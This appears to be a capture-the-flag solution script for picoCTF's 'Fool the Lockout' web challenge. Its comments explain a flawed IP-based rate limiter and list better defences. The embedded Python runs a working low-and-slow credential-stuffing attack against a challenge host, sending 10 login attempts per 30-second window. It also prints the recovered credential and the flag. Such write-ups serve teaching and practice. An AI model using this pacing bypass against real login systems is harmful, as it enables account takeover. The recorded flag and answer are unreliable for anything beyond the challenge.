#!/usr/bin/env bash
set -euo pipefail

# Challenge Name: Fool the Lockout
# Category: Web Exploitation
# Difficulty: Medium
# Event: picoCTF 2026
# Author: DAVID GAVIRIA
#
# Description:
# We are given:
# - the full Flask source code
# - a dump of possible username/password pairs
# - a live login page protected by an IP-based rate limiter
#
# Files in this challenge directory:
# - app.py
# - creds-dump.txt
# - this proof of concept script
#
# Live target used during solving:
# http://candy-mountain.picoctf.net:59460/login
#
# Core lesson:
# A rate limiter can look strong in the UI while still being weak in logic.
# Here the developer wanted to stop credential stuffing, but the implementation
# only blocks clients who exceed 10 POST attempts inside a 30-second epoch.
#
# That means a patient attacker can still brute force the list by doing:
# - 10 attempts
# - wait for the epoch to reset
# - 10 more attempts
# - repeat
#
# Real-world analogy:
# Imagine a security guard saying:
# "You may only try 10 keys every 30 seconds."
# That slows an attacker down, but it does not actually stop one.
# A real defense would combine multiple controls, such as:
# - per-account lockouts
# - CAPTCHA
# - MFA
# - anomaly detection
# - credential stuffing detection
# - IP reputation
# - password hashing and breach monitoring
#
# Step 1: Read the source code.
# Manual command:
# sed -n '1,260p' app.py
#
# Important observations from the code:
# - request_rates is an in-memory dictionary
# - the key is request.remote_addr
# - only POST requests increment the attempt counter
# - MAX_REQUESTS = 10
# - EPOCH_DURATION = 30
# - LOCKOUT_DURATION = 120
#
# Why this matters:
# The crucial bug is in the logic, not in syntax.
# The app does NOT permanently stop brute forcing.
# It only punishes clients who exceed 10 POSTs inside one 30-second window.
#
# So the correct attack is:
# stay at or under 10 attempts per epoch
#
# Step 2: Inspect the credential dump.
# Manual command:
# sed -n '1,260p' creds-dump.txt
#
# Why this matters:
# The app loads exactly one username/password pair from /challenge/profile.json.
# The challenge tells us that pair was chosen from the public credential dump.
#
# So we do not need to guess arbitrary passwords from the universe.
# We only need to test the provided pairs carefully.
#
# Step 3: Understand what NOT to do.
# Bad strategy:
# blast the login endpoint with 100 POST requests quickly
#
# Why that fails:
# After the 11th POST in a 30-second epoch, the app sets:
# lockout_until = now + 120 seconds
#
# That wastes time and confirms the defense works against noisy attackers.
#
# Step 4: Use a patient credential-stuffing strategy.
# Manual attack logic:
# - send 10 login attempts
# - wait 31 seconds
# - send the next 10 attempts
# - repeat until a redirect to "/" occurs
#
# Why this works:
# refresh_request_rates_db() resets num_requests to 0 after the epoch expires.
# So if we never submit the 11th attempt in the same 30-second window, we avoid
# lockout entirely.
#
# Real-world lesson:
# Weak rate limits are often bypassed by slowing down, distributing requests, or
# aligning traffic with the reset window.
# A defense that only stops "fast brute force" may still fail against
# "low-and-slow brute force."
#
# Step 5: Identify the valid credential.
# During solving, the valid pair from the provided dump was:
# deane : shoe
#
# Why this matters:
# Once the right pair is found, the app redirects to "/"
# and the homepage prints the flag directly.
#
# Step 6: Capture the flag.
# Manual command concept:
# use a requests session, log in with the valid pair, follow the redirect,
# and extract picoCTF{...} from the homepage HTML.
#
# Flag obtained:
# picoCTF{f00l_7h4t_l1m1t3r_b9fcf635}
#
# Usage notes:
# - Default mode is FAST: use the recovered valid credential directly.
# - Optional mode --bruteforce replays the discovery method safely using the
#   rate-limit bypass logic from the source code.

mode="${1:-fast}"

python3 - "$mode" <<'PY'
import re
import sys
import time
from pathlib import Path

import requests

base = "http://candy-mountain.picoctf.net:59460"
mode = sys.argv[1]


def extract_flag(html: str) -> str:
    match = re.search(r"picoCTF\{[^}]+\}", html)
    if not match:
        raise SystemExit("Flag not found in response.")
    return match.group(0)


def login_and_get_flag(username: str, password: str) -> str:
    s = requests.Session()
    r = s.post(
        base + "/login",
        data={"username": username, "password": password},
        allow_redirects=False,
        timeout=15,
    )

    if r.status_code not in (301, 302, 303, 307, 308) or r.headers.get("Location") != "/":
        raise SystemExit(f"Login failed for {username}:{password}")

    home = s.get(base + "/", timeout=15)
    return extract_flag(home.text)


def brute_force_safely() -> tuple[str, str, str]:
    creds = []
    for line in Path("/home/eliah/Desktop/Picoctf/Fool_the_Lockout/creds-dump.txt").read_text().splitlines():
        if ";" in line:
            creds.append(tuple(line.split(";", 1)))

    attempts_per_epoch = 10
    sleep_seconds = 31
    s = requests.Session()

    for start in range(0, len(creds), attempts_per_epoch):
        batch = creds[start:start + attempts_per_epoch]
        for username, password in batch:
            r = s.post(
                base + "/login",
                data={"username": username, "password": password},
                allow_redirects=False,
                timeout=15,
            )
            if r.status_code in (301, 302, 303, 307, 308) and r.headers.get("Location") == "/":
                home = s.get(base + "/", timeout=15)
                return username, password, extract_flag(home.text)

        if start + attempts_per_epoch < len(creds):
            time.sleep(sleep_seconds)

    raise SystemExit("No valid credential found in creds-dump.txt")


if mode == "--bruteforce":
    username, password, flag = brute_force_safely()
    print(f"Recovered credential: {username}:{password}")
    print(flag)
else:
    print(login_and_get_flag("deane", "shoe"))
PY
